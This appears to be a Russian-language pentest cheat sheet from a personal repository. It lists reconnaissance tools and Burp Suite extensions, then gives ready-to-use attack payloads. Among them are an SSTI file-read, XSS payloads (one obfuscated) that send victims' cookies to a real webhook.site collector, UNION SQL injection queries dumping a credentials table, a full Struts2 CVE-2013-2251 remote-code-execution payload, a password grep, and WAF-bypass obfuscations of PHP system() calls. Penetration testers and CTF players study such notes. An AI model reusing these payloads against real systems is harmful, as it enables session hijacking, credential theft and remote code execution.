# Hack Tips

## Разведка доменных имен

### [Cero](https://github.com/glebarez/cero)
Cero подключается к удалённым хостам и считывает доменные имена из сертификатов, предоставленных во время TLS-р�[...]  
- Извлекает сертификаты из любого протокола, работающего через TLS (не только HTTPS).  
- Позволяет указывать цели: доменные имена, IP-адреса и диапазоны CIDR (поддержка IPv6).

---

### [hakip2host](https://github.com/hakluke/hakip2host)
Инструмент для возврата связанных доменных имен по списку IP-адресов.  
- DNS PTR-поиски  
- Альтернативные имена субъектов (SAN) в SSL-сертификатах  
- Общие имена (CN) в SSL-сертификатах

---

### [httpx](https://github.com/projectdiscovery/httpx)
Быстрый и многоцелевой HTTP-инструментарий.  
- Позволяет запускать несколько тестов с помощью библиотеки.

---

### [waymore](https://github.com/xnl-h4ck3r/waymore)
Инструмент для поиска архивных ссылок через Wayback Machine.  
- Находит больше ссылок, чем другие инструменты.  
- Загружает архивные ответы и URL-адреса.

---

### [xnLinkFinder](https://github.com/xnl-h4ck3r/xnLinkFinder)
Поиск конечных точек и потенциальных параметров заданной цели.  
- Сканирование одного или нескольких доменов/URL  
- Поиск файлов и параметров в каталогах или файлах  
- Импорт из Burp (XML), ZAP (ASCII), Caido (CSV)  
- Интеграция с результатами waymore

---

## Burp Suite — полезные расширения

### Turbo Intruder
Мощное расширение для проведения высокоскоростных атак (brute-force, fuzzing) с помощью скриптов на Python.  
- Кастомизация логики атаки  
- Обработка ответов для поиска уязвимостей

#### turbo-intruder_script.py
Скрипт для проведения Time-Based SQL Injection с использованием расширения Turbo Intruder для Burp Suite. Скрипт перебирает символы для извлечения схем из базы данных через подстановку значений из файла символов и анализирует задержку в ответах для определения успешных угадываний.

---

### Copy as FFUF Command
Упрощает экспорт запросов из Burp Suite для ffuf.  
- Автоматически формирует команду ffuf по выбранному запросу

### Hackvertor
Расширение для преобразования и кодирования данных в Burp Suite.  
- Большое количество кодировок  
- Удобно для генерации payload'ов, обхода фильтров и анализа данных

### Param Miner
Автоматически ищет скрытые и нестандартные параметры в веб-приложениях.  
- Позволяет находить дополнительные точки атаки

### HackBar
Интерактивное расширение для тестирования и манипулирования HTTP-запросами прямо из Burp Suite.  
- Позволяет быстро конструировать и модифицировать payload'ы  
- Включает функции для кодирования/декодирования (URL, Base64 и др.)  
- Удобно для проведения ручного тестирования (XSS, SQLi, LFI и др.)  
- Поддерживает работу с cookie, заголовками и параметрами  
- Имеет панель быстрого доступа прямо в окне запроса

---

## Веб-уязвимости

### SSTI (Server-Side Template Injection) в Python

#### Mako Templates
- Проверка уязвимости:  
  ```python
  ${7*7}  # → 49
  ```
- Чтение файла:  
  ```python
  <% import os %>${os.popen('cat /etc/passwd').read()}
  ```

---

### XSS Payload

```html
<img src="x" onerror="this.src='https://webhook.site/ed4c7969-5419-4849-bf6d-003858a4c8a2?c='+encodeURIComponent(document.cookie); this.removeAttribute('onerror');">

```

```html
<img src="x" onerror="var cookie=String.fromCharCode(100,111,99,117,109,101,110,116,46,99,111,111,107,105,101); new Image().src='https://webhook.site/ed4c7969-5419-4849-bf6d-003858a4c8a2?c=' + encodeURIComponent(eval(cookie));">
```



#### exploit.svg
Пример SVG-файла с использованием встраивания XML External Entity (XXE). Содержит сущность, ссылающуюся на файл `/etc/passwd`, что может быть использовано для демонстрации или тестирования XXE-уязвимостей.

---

## LFI (Local File Inclusion)
- [PHP Wrappers](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/Wrappers.md)
- [PHP filter chain generator](https://github.com/synacktiv/php_filter_chain_generator) 
- **Top 25 LFI Parameters** — [файл](https://github.com/felixsta/hack_tips/blob/main/Top_25_LFI_Parameters)  
- **LFI Wordlists:**  
  - [SecLists/Fuzzing/LFI](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)  
  - [DragonJAR/Security-Wordlist/main/LFI-WordList-Linux](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux)

#### delimiter_list
Список символов-разделителей, используемый для подбора полезной нагрузки при отравлении кэша (cache poisoning). Содержит различные символы и их URL-кодированные варианты, которые помогают обходить фильтры и изменять поведение кэширования на стороне сервера во время проведения атак или fuzzing.

---

## SQLi (SQL Injection)
- [Stacked Queries](https://www.sqlinjection.net/stacked-queries/)  
- [Pentestmonkey SQLi Cheat Sheet](https://pentestmonkey.net/category/cheat-sheet/sql-injection)
- cn' UNION select 1,database(),2,3-- -	Current database name
- cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -	List all databases
- cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -	List all tables in a specific database
- cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -	List all columns in a specific table
- cn' UNION select 1, username, password, 4 from dev.credentials-- -	Dump data from a table in another database
---
## jQuery
- `jquery.fn.jquery` в `jQuery` возвращает строку, содержащую текущую версию библиотеки `jQuery`. Например, если вы используете `jQuery 3.7.0`, то `jquery.fn.jquery` вернет `3.7.0`

---
## Struts2 CVE-2013-2251 payload
```
/index.action?redirect:%25%7B%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3Dfalse%2C%23f%3D%23_memberAccess.getClass().getDeclaredField%28%22allowStaticMethodAccess%22%29%2C%23f.setAccessible%28true%29%2C%23f.set%28%23_memberAccess%2Ctrue%29%2C%23a%3D%40java.lang.Runtime%40getRuntime%28%29.exec%28%22ls%20-la%22%29.getInputStream%28%29%2C%23b%3Dnew%20java.io.InputStreamReader%28%23a%29%2C%23c%3Dnew%20java.io.BufferedReader%28%23b%29%2C%23d%3Dnew%20char%5B50000%5D%2C%23c.read%28%23d%29%2C%23out%3D%40org.apache.struts2.ServletActionContext%40getResponse%28%29.getWriter%28%29%2C%23out.println%28%23d%29%2C%23out.close%28%29%7D
```

## Поиск кредов
```php
grep -r "password{" /www 2>/dev/null
```

## Обфускация payload для обхода WAF

- Использование шестнадцатеричного или octal-кодирования для скрытия функции.
```php
vuln.php?param=\x73\x79\x73\x74\x65\x6d("whoami")
```
- Динамическое создание строк через массивы символов.
```php
vuln.php?param=$a=['s','y','s','t','e','m'];$a=''.$a[0].$a[1].$a[2].$a[3].$a[4].$a[5];$a('whoami');
```
- Разбиение строки на части с использованием конкатенации или функций PHP. 
```php
vuln.php?param=$_GET[a]($_GET[b]);&a=system&b=whoami
```
- Обход фильтрации пробела, символа `/` команд Linux
```bash
||l$@s${IFS}${PATH:0:1}home
```
